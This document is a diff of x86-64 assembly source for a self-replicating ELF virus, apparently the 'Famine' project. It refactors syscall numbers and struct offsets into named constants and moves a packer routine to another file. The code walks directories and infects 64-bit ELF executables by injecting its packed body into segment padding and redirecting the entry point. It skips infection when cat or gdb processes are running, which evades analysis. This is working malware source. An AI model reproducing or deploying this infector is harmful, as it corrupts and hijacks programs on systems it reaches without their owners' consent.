@@ -8,8 +8,15 @@
 ;|    ,|'|.          ~~                            ~~               ^~^        |
 ;-------------------------------------------------------------------------------
 
+%include "famine.inc"
+
 section.text:
-	global _start:function
+	global _start
+	global _pack_start
+	global _eof
+	global _ft_memmem:function
+	extern _end_host:function
+	extern _pack:function
 
 ; -== Optimization ==-
 ;-> Save bytes:
@@ -65,7 +72,7 @@ _inject:
 		push -1
 		pop r8 ; fd
 		xor r9, r9; offset
-		push 9
+		push SYSCALL_MMAP
 		pop rax; mmap
 		syscall
 
@@ -111,7 +118,7 @@ _inject:
 		pop rsi ; pop length
 
 		; munmap the previous exec
-		push 11
+		push SYSCALL_MUNMAP
 		pop rax
 		syscall
 		pop rdx
@@ -147,7 +154,7 @@ _unpack:; (void *rdi, void *rsi, size_t rdx)
 	.loop_uncompress:
 		cmp rcx, r11
 		jge .end_loop
-		cmp byte[r10 + rcx], 244
+		cmp byte[r10 + rcx], MAGIC_CHAR
 		je .uncompress_char
 			mov al, [r10 + rcx]
 			mov [r9 + r8], al
@@ -239,7 +246,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push rsi
 	pop r13
 
-	push 2
+	push SYSCALL_OPEN
 	pop rax; open
 	push 0o0200000; O_RDONLY | O_DIRECTORY
 	pop rsi
@@ -254,7 +261,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push rax
 	.getdents:
 		pop rdi
-		push 78
+		push SYSCALL_GETDENTS
 		pop rax; getdents
 		push 1024
 		pop rdx; size of buffer
@@ -311,21 +318,21 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 		; check infect_dir or infect_file
 			sub rsp, 600
 
-			push 4
+			push SYSCALL_STAT
 			pop rax ; stat
 			mov rsi, rsp ; struct stat
 			syscall
 			cmp rax, 0x0
 			jne .free_buffers
 
-			mov rax, [rsi + 24] ; st_mode
-			and rax, 0o0170000 ; S_IFMT
+			mov rax, [rsi + ST_MODE]
+			and rax, S_IFMT
 
 			cmp r13, 0; infect
 			je .infect
 
 			; process
-			cmp rax, 0o0040000 ; S_IFDIR
+			cmp rax, S_IFDIR
 			jne .free_buffers
 
 			; if /proc/[nb] -> check /proc/[nb]/status
@@ -366,7 +373,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 			mov rsi, r12
 			add rsi, rcx
 			push rdi
-			movzx edi, word [rsi + 16]; linux_dir->d_reclen
+			movzx edi, word [rsi + D_RECLEN]; linux_dir->d_reclen
 			add rcx, rdi
 			pop rdi
 			jmp .loop_in_file
@@ -380,7 +387,7 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 		push rax
 		pop rsi
 		pop rdi; fd
-		push 3
+		push SYSCALL_CLOSE
 		pop rax; close
 		syscall
 		push r10
@@ -410,7 +417,7 @@ _infect_file: ; (string rdi, stat rsi)
 
 	push rsi
 	pop r12
-	push 2
+	push SYSCALL_OPEN
 	pop rax; open
 	push 0o0000002; O_RDWR
 	pop rsi
@@ -426,13 +433,13 @@ _infect_file: ; (string rdi, stat rsi)
 
 	push r10
 	xor rdi, rdi
-	mov rsi, [r12 + 48] ; statbuf.st_size
+	mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
 	push 3
 	pop rdx ; PROT_READ | PROT_WRITE
 	push 2
 	pop r10 ; MAP_PRIVATE
 	xor r9, r9
-	push 9
+	push SYSCALL_MMAP
 	pop rax ; mmap
 	syscall
 	pop r10
@@ -453,30 +460,30 @@ _infect_file: ; (string rdi, stat rsi)
 	cmp rax, 0x0
 	jne .unmap ; not elf 64 file
 
-	cmp byte[rsi + 16], 2 ; ET_EXEC
+	cmp byte[rsi + E_TYPE], ET_EXEC ; ET_EXEC
 	je .is_elf_file
-	cmp byte[rsi + 16], 3 ; ET_DYN
+	cmp byte[rsi + E_TYPE], ET_DYN ; ET_DYN
 	jne .unmap
 
 	.is_elf_file:
 		; TODO: do 32 bits version (new compilation ?)
 
 		; get pt_load exec
-		mov ax, [r13 + 56]; e_phnum
+		mov ax, [r13 + E_PHNUM]; e_phnum
 		mov rbx, r13
-		add rbx, [r13 + 32]; e_phoff
+		add rbx, [r13 + E_PHOFF]; e_phoff
 		xor rcx, rcx
 		.find_segment_exec:
 			inc rcx
 			cmp rcx, rax ; TODO: can't be last PT_LOAD now
 			je .unmap
-			cmp dword[rbx], 1 ; p_type != PT_LOAD
+			cmp dword[rbx], PT_LOAD ; p_type != PT_LOAD
 			jne .next
-			mov dx, [rbx + 4]; p_flags
-			and dx, 1 ; PF_X
+			mov dx, [rbx + P_FLAGS]; p_flags
+			and dx, PF_X ; PF_X
 			jnz .check_if_infected
 			.next:
-				add rbx, 56; sizeof(Elf64_Phdr)
+				add rbx, SIZEOF(ELF64_PHDR); sizeof(Elf64_Phdr)
 			jmp .find_segment_exec
 		.check_if_infected:
 			lea rdi, [rel signature]
@@ -485,9 +492,9 @@ _infect_file: ; (string rdi, stat rsi)
 			pop rcx
 			push rdi
 			pop rdx
-			mov rdi, [rbx + 8]; p_offset
+			mov rdi, [rbx + P_OFFSET]; p_offset
 			add rdi, r13
-			mov rsi, [rbx + 32]; p_filesz
+			mov rsi, [rbx + P_FILESZ]; p_filesz
 			cmp rsi, rcx
 			jl .unmap
 			call _ft_memmem
@@ -496,9 +503,9 @@ _infect_file: ; (string rdi, stat rsi)
 
 			; check size needed
 			sub rdi, r13
-			mov rdi, [rbx + 8]
+			mov rdi, [rbx + P_OFFSET]
 			add rdi, rsi; p_offset + p_filesz
-			mov rsi, [rbx + 56 + 8] ; next->p_offset
+			mov rsi, [rbx + SIZEOF(ELF64_PHDR) + P_OFFSET] ; next->p_offset
 			sub rsi, rdi
 
 			add rdi, 8 * 3 ; let space for params
@@ -506,7 +513,7 @@ _infect_file: ; (string rdi, stat rsi)
 			lea r9, [rel _params]
 			lea rax, [rel _eof]
 			sub rax, r9
-			mov r9, [r12 + 48]; statbuf.st_size
+			mov r9, [r12 + ST_SIZE]; statbuf.st_size
 			sub r9, rdi
 			; check not enough size
 			; (file_size - (p_offset + p_filesz) < unpacked virus size)
@@ -569,29 +576,29 @@ _infect_file: ; (string rdi, stat rsi)
 			sub rdi, r13
 			; copy mapped 'padding' like 0x400000
 			mov rsi, rdi
-			add rsi, [rbx + 16]; p_vaddr
-			sub rsi, [rbx + 8]; p_offset
+			add rsi, [rbx + P_VADDR]; p_vaddr
+			sub rsi, [rbx + P_OFFSET]; p_offset
 			mov [rax], rsi ; entry_inject
 			add rax, 8
-			mov rsi, [r13 + 24]; entry_prg
+			mov rsi, [r13 + E_ENTRY]; entry_prg
 			mov [rax], rsi
 
 			; change entry
 			; copy mapped 'padding' like 0x400000
-			add rdi, [rbx + 16]; vaddr
-			sub rdi, [rbx + 8]; p_offset
-			mov [r13 + 24], rdi ; new_entry
+			add rdi, [rbx + P_VADDR]; vaddr
+			sub rdi, [rbx + P_OFFSET]; p_offset
+			mov [r13 + E_ENTRY], rdi ; new_entry
 
 			; change pt_load size
-			add [rbx + 32], rdx; p_filesz + virus
-			add [rbx + 40], rdx; p_memsz + virus
+			add [rbx + P_FILESZ], rdx; p_filesz + virus
+			add [rbx + P_MEMSZ], rdx; p_memsz + virus
 
 			; write everything in file
 			mov rdi, r11
 			push r11
 			mov rsi, r13
-			mov rdx, [r12 + 48]
-			push 1
+			mov rdx, [r12 + ST_SIZE]
+			push SYSCALL_WRITE
 			pop rax
 			syscall
 			pop r11
@@ -599,15 +606,15 @@ _infect_file: ; (string rdi, stat rsi)
 		push r11; munmap using r11 ?
 		push r13
 		pop rdi
-		mov rsi, [r12 + 48] ; statbuf.st_size
-		push 11
+		mov rsi, [r12 + ST_SIZE] ; statbuf.st_size
+		push SYSCALL_MUNMAP
 		pop rax; munmap
 		syscall
 		pop r11
 	.close:
 		push r11
 		pop rdi
-		push 3
+		push SYSCALL_CLOSE
 		pop rax; close
 		syscall
 	.return:
@@ -634,7 +641,7 @@ _check_file_process:; (string rdi)
 	sub rsp, 0x800; buffer to read
 
 	xor rsi, rsi; O_RDONLY
-	push 2
+	push SYSCALL_OPEN
 	pop rax; open
 	syscall
 	push rdi
@@ -684,7 +691,7 @@ _check_file_process:; (string rdi)
 		pop rsi
 		push r9
 		pop rdi
-		push 3
+		push SYSCALL_CLOSE
 		pop rax; close
 		syscall
 		push rsi
@@ -873,110 +880,3 @@ elf_magic db 0x7f, 0x45, 0x4c, 0x46, 0x2, 0x0
 	process db `\tcat\n`, 0x0, `\tgdb\n`, 0x0, 0x0
 
 _eof:
-
-; ------------------------------- HOST ---------------------------------------
-
-; don't need to copy the host part
-; v
-
-_end_host:
-	push 60
-	pop rax ; exit
-	xor rdi, rdi; = 0
-	syscall
-
-;               v dest
-_pack: ;(void *rdi) -> ret size + fill rdi
-	push r8
-	push r10
-	push r11
-	push r12
-	push rbx
-	push rcx
-	push rdx
-	push rsi
-
-	lea rdx, [rel _eof]
-	lea r10, [rel _pack_start] ; dictionary = addr
-	mov r11, r10; buffer = addr
-	sub rdx, r10; size
-
-	xor rcx, rcx; i = 0
-	xor r8, r8; l = 0
-	.loop_compress:
-		cmp rcx, rdx; while (i < size) {
-		jge .end_compress
-		mov rsi, r10
-		sub rsi, r11; len = dictionary - buffer
-		cmp rsi, 255; if (len > 255) {
-		jle .continue
-		add r11, rsi
-		sub r11, 255; buffer += len - 255
-		mov rsi, r10
-		sub rsi, r11; len = dictionary - buffer
-		.continue: ; }
-		push 1
-		pop rbx; k = 1
-		xor r12, r12; prev_ret = 0
-		.loop_memmem:; while
-			cmp rbx, 255
-			jge .end_memmem; (k < 255
-			mov rax, rbx
-			add rax, rcx
-			cmp rax, rdx; && i + k < size)
-			jge .end_memmem
-			push rdi
-			push rdx
-			push rcx
-			mov rdi, r11
-			mov rdx, r10
-			mov rcx, rbx
-			call _ft_memmem; ret = ft_memmem(buffer, len, dictionary, k)
-			pop rcx
-			pop rdx
-			pop rdi
-			cmp rax, 0x0; if (!ret) break
-			je .end_memmem
-			push rax
-			pop r12; prev_ret = ret
-			inc rbx; k++
-		jmp .loop_memmem
-		.end_memmem:; }
-		dec rbx; k--
-		cmp r12, 0x0; if (prev_ret
-		je .not_compress_char
-		cmp rbx, 4; && k >= 4) {
-		jl .not_compress_char
-		mov byte[rdi + r8], 244; addr[l] = 244
-		inc r8; l++
-		mov rax, r10
-		sub rax, r12
-		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
-		inc r8; l++
-		mov rax, rbx
-		mov byte[rdi + r8], al; addr[l] = k
-		inc r8; l++
-		jmp .next_loop; }
-		.not_compress_char:; else {
-		push 1
-		pop rbx; k = 1
-		mov al, [r10]
-		mov byte[rdi + r8], al; addr[l] = *dictionary
-		inc r8; l++
-	.next_loop:; }
-		add r10, rbx; dictionary += k
-		add rcx, rbx; i += k
-		jmp .loop_compress
-	.end_compress: ; }
-		push r8
-		pop rax
-
-	pop rsi
-	pop rdx
-	pop rcx
-	pop rbx
-	pop r12
-	pop r11
-	pop r10
-	pop r8
-ret
